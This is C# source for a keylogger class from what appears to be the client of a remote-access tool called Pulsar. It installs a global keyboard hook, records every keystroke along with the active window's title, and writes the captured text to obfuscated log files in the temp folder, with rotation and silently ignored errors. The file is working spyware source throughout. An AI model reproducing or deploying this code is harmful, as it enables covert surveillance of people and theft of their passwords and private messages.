using Gma.System.MouseKeyHook;
using Pulsar.Client.Helper;
using Pulsar.Common.Helpers;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Timers;
using System.Windows.Forms;
using Timer = System.Timers.Timer;

namespace Pulsar.Client.Logging
{
    public class Keylogger : IDisposable
    {
        private readonly long _maxLogFileSize;
        private readonly Timer _flushTimer;
        private readonly object _syncLock = new object();
        private readonly StringBuilder _lineBuffer = new StringBuilder();
        private readonly IKeyboardMouseEvents _events;

        private string _currentWindow = string.Empty;
        private DateTime _lastWindowChange = DateTime.UtcNow;
        private string _logFilePath;
        private readonly TimeSpan _windowChangeThreshold = TimeSpan.FromSeconds(1);
        private bool _isFirstWrite = true;
        private readonly HashSet<Keys> _activeModifiers = new HashSet<Keys>();
        public bool IsDisposed { get; private set; }

        public Keylogger(double flushInterval, long maxLogFileSize)
        {
            _maxLogFileSize = maxLogFileSize;
            _events = Hook.GlobalEvents();
            _logFilePath = GetLogFilePath();

            _flushTimer = new Timer(flushInterval);
            _flushTimer.Elapsed += TimerElapsed;
            _flushTimer.AutoReset = true;
        }

        public void Start()
        {
            Subscribe();
            _flushTimer.Start();
        }

        private void Subscribe()
        {
            _events.KeyDown += OnKeyDown;
            _events.KeyPress += OnKeyPress;
        }

        private void Unsubscribe()
        {
            _events.KeyDown -= OnKeyDown;
            _events.KeyPress -= OnKeyPress;
        }

        private void OnKeyDown(object sender, KeyEventArgs e)
        {
            string newWindow = NativeMethodsHelper.GetForegroundWindowTitle() ?? "Unknown Window";

            lock (_syncLock)
            {
                bool windowChanged = !string.Equals(newWindow, _currentWindow, StringComparison.Ordinal);
                bool incrementalChange = !string.IsNullOrEmpty(_currentWindow) && newWindow.StartsWith(_currentWindow);

                if (windowChanged && !incrementalChange && DateTime.UtcNow - _lastWindowChange > _windowChangeThreshold)
                {
                    FlushLineBuffer();
                    _currentWindow = newWindow;
                    _lastWindowChange = DateTime.UtcNow;
                    _lineBuffer.AppendLine($"[{DateTime.Now:HH:mm:ss}] {newWindow}");
                }

                HandleSpecialKey(e);
            }
        }

        private readonly HashSet<Keys> _heldModifiers = new HashSet<Keys>();

        private void HandleSpecialKey(KeyEventArgs e)
        {
            // Track modifier state (pressed)
            if (e.KeyCode == Keys.LShiftKey || e.KeyCode == Keys.RShiftKey ||
                e.KeyCode == Keys.LControlKey || e.KeyCode == Keys.RControlKey ||
                e.KeyCode == Keys.LMenu || e.KeyCode == Keys.RMenu)
            {
                _heldModifiers.Add(e.KeyCode);
                return;
            }

            // Build modifier label once per key combo
            string modText = "";
            foreach (var mod in _heldModifiers)
                modText += $"[{mod.ToString().Replace("Key", "")}]";

            switch (e.KeyCode)
            {
                case Keys.Enter:
                    _lineBuffer.AppendLine();
                    FlushLineBuffer();
                    break;
                case Keys.Back:
                    if (_lineBuffer.Length > 0) _lineBuffer.Length--;
                    break;
                case Keys.Space:
                    _lineBuffer.Append(' ');
                    break;
                case Keys.Tab:
                    _lineBuffer.Append(modText + "[Tab]");
                    break;
                case Keys.Escape:
                    _lineBuffer.Append(modText + "[Esc]");
                    break;
                case Keys.Delete:
                    _lineBuffer.Append(modText + "[Del]");
                    break;
                case Keys.Up:
                    _lineBuffer.Append(modText + "[Up]");
                    break;
                case Keys.Down:
                    _lineBuffer.Append(modText + "[Down]");
                    break;
                case Keys.Left:
                    _lineBuffer.Append(modText + "[Left]");
                    break;
                case Keys.Right:
                    _lineBuffer.Append(modText + "[Right]");
                    break;
                default:
                    if (e.KeyCode >= Keys.F1 && e.KeyCode <= Keys.F24)
                        _lineBuffer.Append(modText + $"[{e.KeyCode}]");
                    break;
            }
        }

        private void OnKeyPress(object sender, KeyPressEventArgs e)
        {
            lock (_syncLock)
            {
                if (!char.IsControl(e.KeyChar))
                    _lineBuffer.Append(e.KeyChar);
            }
        }

        private void OnKeyUp(object sender, KeyEventArgs e)
        {
            // When modifier is released, remove from active list
            if (_heldModifiers.Contains(e.KeyCode))
                _heldModifiers.Remove(e.KeyCode);
        }



        private void TimerElapsed(object sender, ElapsedEventArgs e)
        {
            try { FlushLineBuffer(); }
            catch { /* ignore */ }
        }

        private void FlushLineBuffer()
        {
            lock (_syncLock)
            {
                if (_lineBuffer.Length == 0) return;

                string content = _lineBuffer.ToString();

                // Normalize multiple spaces to a single space
                content = System.Text.RegularExpressions.Regex.Replace(content, @"[ ]{2,}", " ");

                _lineBuffer.Clear();

                WriteToFile(content);
            }
        }

        private void WriteToFile(string content)
        {
            if (string.IsNullOrWhiteSpace(content)) return;

            try
            {
                FileHelper.WriteObfuscatedLogFile(_logFilePath, content + Environment.NewLine);

                FileInfo info = new FileInfo(_logFilePath);
                if (info.Length > _maxLogFileSize)
                    RotateLogFile();

                _isFirstWrite = false;
            }
            catch { /* ignore */ }
        }

        private void RotateLogFile()
        {
            try
            {
                string baseName = DateTime.UtcNow.ToString("yyyy-MM-dd");
                string basePath = Path.Combine(Path.GetTempPath(), baseName);
                string newFilePath = basePath + ".txt";

                int counter = 1;
                while (File.Exists(newFilePath))
                {
                    newFilePath = $"{basePath}_{counter:00}.txt";
                    counter++;
                }

                _logFilePath = newFilePath;
                _isFirstWrite = true;
            }
            catch { /* ignore */ }
        }

        private string GetLogFilePath()
        {
            return Path.Combine(Path.GetTempPath(), DateTime.UtcNow.ToString("yyyy-MM-dd") + ".txt");
        }

        public void FlushImmediately() => FlushLineBuffer();

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (IsDisposed) return;

            if (disposing)
            {
                FlushLineBuffer();
                Unsubscribe();
                _flushTimer.Stop();
                _flushTimer.Dispose();
                _events.Dispose();
            }

            IsDisposed = true;
        }
    }
}
